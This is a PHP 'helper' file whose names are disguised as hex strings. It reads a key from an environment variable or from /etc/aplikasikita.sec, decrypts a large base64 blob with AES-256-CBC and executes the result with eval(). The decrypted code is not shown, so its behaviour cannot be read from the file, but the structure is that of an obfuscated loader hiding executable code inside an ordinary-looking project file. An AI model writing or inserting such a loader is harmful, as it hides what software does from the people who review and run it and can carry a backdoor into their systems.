<?php
namespace App\Helpers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('RdSzXrS449sHTQBRGN97IA==');

$c=base64_decode(

'hXKndghY/4Gb1lQ3tEYafGbUGJJ26Hdp30NxR/7sR7xbvCIZApIOGu4EWj9DzJSf17wDfwN3STws' .
'RlxZNh0hBNMvZt9ebdxGkU43jUtT0DIUQ1O7d4Mzl3dk3s8gsdyo6qSka5FNcGcXNdTKN9CGpoyY' .
'ql2x83nUlbnFqTvff2JGvWvlItmVJgnpF6YQu/qqW5HHD26Qt8ccucoLYeELa2UDJ2xdWkAp9zE6' .
'pGl5WzEdr6VKOTywpQE0FkGtdG1kiJPtnW4Z55Miv48mV24s6SaMl5QaAWMG0es8cO0suesN5Ydd' .
'JSyYFTeqHdU4r2Izdjbg0hyjzovodnqr9bHALHIkv76EV+iqDkVYNsZWKuTT4zyg9SxLS3BpwuLm' .
'QpSsWx/QMZa3p0Vxend/k/4RGf8OdVlgy9YtHF5vHFHZ+kQpIdWt2AGcDC6ROJHk+avRGebQzOPh' .
'snG6HTqQ+6T8/of3JiSfe1l4isD/NyA2jtZK9NWoQleivNOp3pSQn9+Jl0xlkEeRUlT9uNAwiDTh' .
'RnXLqVj1VnnJdn0MmVjEhjpvIdFUcGr343TUurjkwxXS+lCEsflfje7Z1FJ/axvOle+W9cx8Mowp' .
'DNV0UUY6Bv5V7t3VdStDafPYja4gCRGu75iRD2ChQ6XSvgibhbiW+iRo82O+TEXL1NuobC8AbG9B' .
'FvVAL904a625OunVHF34OlFI8puopeu17X0qQJnUTusmwNEtud264fhcT/fUjgoT7tsq9e/zP+3/' .
'SZzNNr2+UM+6bYs64XhsQcU4iAPw7HD27PdwsdSKFiairaRXkg8NnFbp3lk2FGfUu0BaVetzfpQK' .
'nMVq1tsX4IhD7vY3XEap6BTWXhL/iPjKCAOOeubw/BFKwCBnYcMvEsxps3OcllPrqSwrMMKn56H7' .
'K/ydmr6puAnlJzFTw0zehHiTqD+1Dq/VYNZ1DiRQuB8ur8I6RL43hhEtRR0lDokCkZXFY7y3wZbx' .
'kmIpPUi9gO9GYp7NyWiv0FCXri2zK78mrzRzVzt8Q//BOObHwNVZTWb0cj83I7aHsnUZP0oI9xs2' .
'wmRDtcINee1MegkLqJFKbhthWX6bYeU7QEm86BNNppvl2URLRRr5zuOebZvzK3mzjGF3dh2OvZ/d' .
'V08y75tpMRZ9RR0rHkahUXAEITqgTuDfQ7yzbNN+nAmzWbnMRDuqoKJl6u9DlZBG6BFN9Lvqm8hA' .
'qoUkSVTmyPfHY5Ns/aInpdxCb2cL2fSCXSdXK37EXz9CJyJnhNCCH9dWVBsSiomgLbrJifQ1o5hU' .
'oVhZ1ZnNk1Ske0+v+VI4w1sKi/Ao8OPymg28n4MF3n7+aheXhm07OSrO7RUkeFz4MYuEhSgZzMVG' .
'BkMD1cEg6P32lUoFhXf88y5Jmn8+bXWxh5PgROlx+d0B3phLEbe4OgWQ7v0roCju84iMCv7c/3UC' .
'OthUnuHR9r/8mtI5ElEO92OyJbYbz8/jdl/QCMAv58mfskLjqOw44bxRBa415/+dPkEyS/fAshvX' .
'X7ZylYkQqKX2rhmudgwSQ8hN0sWL8InPAYkXkOIa3WZeCR/7XNj9YZR6jSei1Tlke6y2LrlhE8Nc' .
'nPddqF5sPia9ly5fiUrZZb44iGW1yMs+opUoLY4JchJPM9teVItZtXhrol1nmUVCPnwwC+zWzJWm' .
'lOAd7iHKRlgDabxOJJt4GYfzNKmv/LsPoNDwU4C7E0lCPthpgPDQPlLMMbGeQwnD9vr/Vg/xgSLi' .
'43dpJUPAkpY/OgmduSRBdvRKWwJkjmMydqInX7cSQ2mZuVTEgbNHVpfuNpRDuGtNeRhnbvyOLw6F' .
'aiEAQO1tysuHe5wE3hVXryyIDWAHZN/gNxGumJesEPKnVe4N6aQ5Bs16/gPfT9MdI3hfcA1qzpMA' .
'YB2xskz+8kd1pznaFXDQSCR6MXzNbcVvKHZNfCcNO9WB7j6wyZ+qKxmnQ3D53wLr6OlxBu3zDq+K' .
'8IE4R2VtKTtM0D6Liyx9Bd7ZszTQLA4+XQ7hPb2NFKOVy47jNVfMDRMQMkKAL6qrWguMjQ/Mn3WW' .
'I3GWbWPJ5OuRslAgZx6e4SMb2VG3tIAtFuDJ00pkhuJf02HjLHKNntx2NiBf02e8wwSmROf3iWTV' .
'Y2h3g40B4XmxUd7mJ6E0Dzu7AeG1yMGZhDf5EqwO03gvX1dpmXxbGiIGgHnV1LB6atT+a80Jzvx4' .
'EE2DNFY8OytG8x13IopzFpAgsRNoZ3y0ZYQ1cf6J5eNHz7d8bDA/OmUH/2NZcyRX94CCh5pqzCU9' .
'zoLmi3W4+sJG+kAVyqOxI5miuTGDf1rKuJUMpQC55OlT4gox3jrYr+PGhCYZzDcZ4v1vSy/5ipNO' .
'VWmtAkuGM5VsVqgzloB67E5kfWyvUVhs9Hxy84ppWu2fedderfFtSm2EZh2OuD0cRVdvOrkqTgMn' .
'3FWFvqAWxPDt0RNCK0CMzO0S36olH3XL/GvRYmod1KOB9I2wi4uG/Upf4q8SlkkBruDUd9ixZr9D' .
'W+lrwIRKWr3e/NNxZuy3BOfdxV+q9HOku2EuRUrfgNMVZa7wWxgXYVqqnk484s/36f8ugihgsfFz' .
'y6ETvqDvKb4bslGLeD+RqyV7GElxwmPMKTOTtTyCeL0rK1Kn0GtpBX/cVUIrUdqm2jDZJQp0NDr3' .
'x/XKWsefj4655k+0qVaCo5Hjwq8RGt3coou5t6a2CNAInbMBZB6KiCmESuLDeW+vB6JvZ/Qd+J8C' .
'vtSbWJzGfYyi5YpqSGtEIx7gGs0LZQdHt4sDwRTituvLpKW8NPFQq9212L4Rz2GmQxQjDORb1nb3' .
'zA9e7WLSbFkHOope4pC0NtK3rZaamEdDOr+LQF7BOiGGywAiAHwEfIosJvzcEBFsRyCQPbYOyEoh' .
'btdQpAncsLprjU7lQrQ7ur2rpegrML6EL/wSuUdpfhBA6p6xyKv2kjzHuskzmb0a9zh2COpT6n/N' .
'hmwe8lFk4sopJR8HVqV1KAU='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

